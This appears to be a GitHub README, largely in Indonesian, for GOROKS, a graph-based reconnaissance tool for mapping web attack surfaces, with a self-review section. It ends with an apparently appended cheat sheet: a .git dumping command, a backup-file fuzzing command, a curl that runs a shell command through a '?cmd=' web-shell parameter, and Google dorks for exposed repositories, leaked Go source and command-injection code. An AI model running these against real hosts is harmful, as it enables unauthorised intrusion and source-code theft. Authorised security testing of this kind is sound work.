---

# GOROKS

<img width="967" height="645" alt="image" src="https://github.com/user-attachments/assets/46ce889d-4dc6-4d04-bd04-2f7175538237" />

## GOROKS (Graph-Oriented Recon & Observation Kernel System)


GOROKS adalah **attack surface intelligence engine berbasis graph** yang dirancang untuk analisis keamanan aplikasi web modern (GitLab, Go service, REST API, dan hybrid SPA backend).

---

## ⚙️ Core Capabilities (v8 Architecture)

### 1. 🔍 Surface Discovery Engine

* Crawl deterministic + seeded BFS graph expansion
* Endpoint inference berbasis:

  * GitLab routing schema
  * Go net/http pattern inference
  * SPA JS route extraction

---

### 2. 🧠 JS AST Deep API Extraction (v8 upgrade)

* Parsing pola:

  * `fetch()`
  * `axios.*`
  * `XMLHttpRequest`
* Endpoint reconstruction:

  * `/api/v1/*`
  * `/graphql`
  * `/mutation`
* Context-aware endpoint normalization

---

### 3. 🧩 Graph Attack Path Simulation

* Build directed graph:

```
[Entry Point]
   → /login
   → /dashboard
   → /api/v1/user
   → /api/v1/admin
```

* Edge weight:

  * auth barrier
  * privilege delta
  * API sensitivity

---

### 4. 🔐 Auth Boundary Modeling

Klasifikasi endpoint:

| Type     | Description                 |
| -------- | --------------------------- |
| PUBLIC   | No authentication required  |
| AUTH     | Requires session/token      |
| ADMIN    | Elevated privilege required |
| INTERNAL | Hidden service route        |

---

### 5. ⚠️ Severity Scoring Engine

Model risk:

```
Risk = Exposure + Privilege Impact + Data Sensitivity + Chaining Depth
```

Kategori:

| Score | Level    |
| ----- | -------- |
| 0–3   | LOW      |
| 4–6   | MEDIUM   |
| 7–8   | HIGH     |
| 9–10  | CRITICAL |

---

### 6. 🔗 Endpoint Chaining (CVE-style mapping)

Contoh:

```
/login → /api/user → /api/admin → /internal/debug
```

Digunakan untuk:

* privilege escalation simulation
* lateral movement analysis

---

## 📦 Dependencies

```bash
curl
ffuf
jq
grep
awk
sed
bash 4+
chromium (optional runtime AST mode)
```

---

## 🚀 Installation

```bash
git clone https://github.com/ebenhaezer19/Goroks.git
cd Goroks
chmod +x go_source_recon.sh
```

---

## ▶️ Usage

```bash
./go_source_recon.sh <target>
```

Example:

```bash
./go_source_recon.sh https://git.example.com
```

---

## 🧱 Pipeline Architecture

```
Fingerprinting
   ↓
Seed Graph Builder
   ↓
GitLab Intelligence Layer
   ↓
JS Asset Extraction
   ↓
AST API Mining
   ↓
Graph Construction Engine
   ↓
Auth Boundary Classifier
   ↓
Chaining Simulator
   ↓
Risk Scoring Engine
   ↓
Report Generator
```

---

## 📁 Output Structure (v8)

```
asge_v8_*/
├── headers.txt
├── body_snippet.txt
├── seeds.txt
├── urls.txt
├── js_assets.txt
├── js_routes.txt
├── surface_map.txt
├── graph.json
├── auth_model.json
├── risk_score.json
├── chain_paths.txt
└── report.txt
```

---

## 📊 Surface Map Format

```
[SOURCE][WEB][HIGH][AUTH] /api/v1/admin/users
[SOURCE][WEB][MEDIUM][AUTH] /api/v1/projects
[SOURCE][WEB][LOW][PUBLIC] /help
```

---

## 🧠 Key Innovation (v8)

### Before (v7)

* URL enumeration
* basic fuzzing
* static JS grep

### Now (v8)

* attack graph reasoning
* endpoint dependency chaining
* privilege modeling
* risk scoring engine

---

## ⚠️ Known Issues

### CRLF Bash Error

```
/usr/bin/env: ‘bash\r’: No such file or directory
```

Fix:

```bash
dos2unix go_source_recon.sh
```

Verify:

```bash
head -n 1 go_source_recon.sh | cat -A
```

Expected:

```
#!/usr/bin/env bash$
```

---

## 🔐 Security Boundary

Tool ini dirancang untuk:

* Security research
* Internal AppSec testing
* Authorized penetration testing
* Attack surface auditing

❌ Dilarang:

* scanning sistem tanpa izin
* exploitation aktif
* data exfiltration

---

## 🧭 Architecture Summary

```
Internet Surface
   ↓
Graph Builder
   ↓
API & JS AST Extractor
   ↓
Auth Model Engine
   ↓
Attack Path Simulator
   ↓
Risk Engine
   ↓
Report Layer
```

---

## 👨‍💻 Author

GOROKS Research Engine — Attack Surface Intelligence System

---

# ⚠️ Analisis Profesional (seperti dosen penguji)

Secara engineering:

### ✔ Sudah benar

* pipeline modular (core/*)
* separation of concerns
* graph-based thinking sudah tepat

### ❌ Belum benar-benar “v8 engine”

Yang masih missing di implementasi:

* graph.json belum benar-benar structured graph (node-edge model)
* AST JS belum parsing (masih grep-based)
* auth boundary masih heuristic string match
* risk model belum probabilistic / weighted scoring formal

---



cd ~/go-pentest

# Full recon
./go_source_recon.sh http://target.com

# Quick git check only
curl -s http://target.com/.git/HEAD && ./gitdumper.sh http://target.com/.git ./dump

# Backup hunt only
ffuf -u http://target.com/FUZZ -w go_wordlist.txt -mc 200

# RCE source dump
curl "http://target.com/?cmd=find%20/ -name '*.go' | head -10"


# DORKS 
## Git Repos
inurl:".git/config" "go 1." 
intitle:"index of" inurl:.git "go.mod"
inurl:/.git/HEAD "ref: refs/heads/main"

## Source Code Leaks
filetype:go "package main" "http.HandleFunc"
intext:"func main() {" "net/http" "exec.Command"
"r.URL.Query().Get" "cmd" "exec.Command" filetype:go
"sh, -c, cmd" filetype:go

## Backup Files
intitle:"index of" "main.go"
intext:"main.go~" OR "main.go.bak" OR "app.go.swp"
"handlers.go" ext:go~ OR ext:go.bak

## Go Modules
inurl:go.mod "module"
intitle:"index of" "go.sum"

## Docker & Deploy
intitle:"index of" Dockerfile "FROM golang"
"Dockerfile" "COPY . /app" "go build"

## RCE Indicators
"exec.Command("sh", "-c" filetype:go
"r.URL.Query().Get("cmd")" filetype:go
"os/exec" "http.HandleFunc" filetype:go
